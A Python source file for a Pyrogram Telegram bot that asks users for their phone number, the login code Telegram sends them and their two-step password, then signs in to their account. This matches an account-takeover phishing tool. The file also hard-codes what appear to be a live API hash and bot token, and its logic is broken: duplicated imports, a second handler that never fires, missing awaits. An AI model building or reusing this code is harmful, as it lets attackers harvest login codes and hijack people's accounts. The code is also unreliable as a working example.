from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid
from pyrogram.types import Message



from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid
from pyrogram.types import Message

api_id = 10247139  # Replace with your API ID
api_hash = "96b46175824223a33737657ab943fd6a"  # Replace with your API Hash
bot_token = "7293653178:AAGcJSttQbNUK0ORBmf6G9yy7LBLsxuU_k8"  # Replace with your Bot Token

app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

# Dictionary to store user data
user_data = {}

@app.on_message(filters.command("start"))
async def start(client: Client, message: Message):
    await message.reply("Welcome! Please enter your phone number in the format +123456789.")

@app.on_message(filters.text & filters.private)
async def handle_phone_number(client: Client, message: Message):
    phone_number = message.text.strip()
    user_id = message.from_user.id
    
    # Save phone number in user_data
    user_data[user_id] = {"phone_number": phone_number}
    
    try:
        # Send the OTP
        sent_code_info = client.send_code(phone_number)
        user_data[user_id]["sent_code_info"] = sent_code_info
        await message.reply("OTP sent! Please enter the code you received.")
    except Exception as e:
        await message.reply(f"Error sending OTP: {str(e)}")

@app.on_message(filters.text & filters.private)
async def handle_otp(client: Client, message: Message):
    user_id = message.from_user.id
    
    if user_id not in user_data or "sent_code_info" not in user_data[user_id]:
        await message.reply("Please start by entering your phone number first.")
        return
    
    phone_code = message.text.strip()
    sent_code_info = user_data[user_id]["sent_code_info"]
    
    try:
        # Attempt to sign in using the provided OTP
        client.sign_in(user_data[user_id]["phone_number"], sent_code_info.phone_code_hash, phone_code)
        await message.reply("You are now logged in!")
        
        # Optionally send a test message to verify success
        client.send_message("me", "That's work!")  # Checking work
        
    except SessionPasswordNeeded:
        password = await client.ask(message.chat.id, "Please enter your password:")
        try:
            client.check_password(password.text)
            await message.reply("You are now logged in!")
            client.send_message("me", "That's work!")  # Checking work
        except PasswordHashInvalid:
            await message.reply("Password error. Please try again.")
    
    except PhoneCodeInvalid:
        await message.reply("Invalid code. Please try again.")
    
    except Exception as e:
        await message.reply(f"An error occurred: {str(e)}")

# Run the bot
app.run()
